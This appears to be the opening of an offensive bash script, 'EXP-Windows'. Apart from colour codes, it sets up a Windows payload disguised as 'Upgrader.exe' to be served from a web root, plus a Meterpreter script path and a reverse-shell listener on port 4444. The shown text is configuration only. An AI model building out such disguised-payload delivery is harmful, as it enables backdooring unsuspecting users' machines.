#!/bin/bash

ScriptAuthor="MidNightSonne"
ScriptName="EXP-Windows"
ScriptVersion="1.0-0"
ConfigVersion="1.0-0"

BashVersion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
MinBashVersion="4.4"

CNC='\e[0m' # No Color
CWE='\e[0;1m' # White Color
CBK='\e[0;30m' # Black Color
CGY='\e[1;30m' # Gray Color
CRD='\e[0;31m' # Red Color
CLRD='\e[1;31m' # L Red Color
CGN='\e[0;32m' # Green Color
CLGN='\e[1;32m' # L Green Color
CYW='\e[0;33m' # Yellow Color
CLYW='\e[1;33m' # L Yellow Color
CBE='\e[0;34m' # Blue Color
CLBE='\e[1;34m' # L Blue Color
CPE='\e[0;35m' # Purple Color
CLPE='\e[1;35m' # L Purple Color
CCN='\e[0;36m' # Cyan Color
CLCN='\e[1;36m' # L Cyan Color
CLGY='\e[0;37m' # L Gray Color

TNL='\e[0;0m' # 0 - Normal Text
TBD='\e[1;1m' # 1 - Bold or Light Text
TDM='\e[2;1m' # 2 - Dim Text
TUD='\e[4;1m' # 4 - Underlined Text
TBG='\e[5;1m' # 5 - Blinking Text
TRD='\e[7;1m' # 7 - Reversed Text
THN='\e[8;1m' # 8 - Hidden Text

CAMRK="\e[0;33m\xe2\x9c\xb1" # Attention Check Mark
CGMRK="\e[0;32m\xe2\x9c\x94" # Good Check Mark
CBMRK="\e[0;31m\xe2\x9c\x98" # Bad Check Mark

Exe_Name="Upgrader"
Exe_Path="/var/www/html/$Exe_Name.exe"
Index_Path="/var/www/html/index.html"
Meterpreter_Path="/tmp/metasploit.sh"

LHOST=$(ip a | grep "scope global" | grep -Po '(?<=inet )[\d.]+')
LPORT="4444"
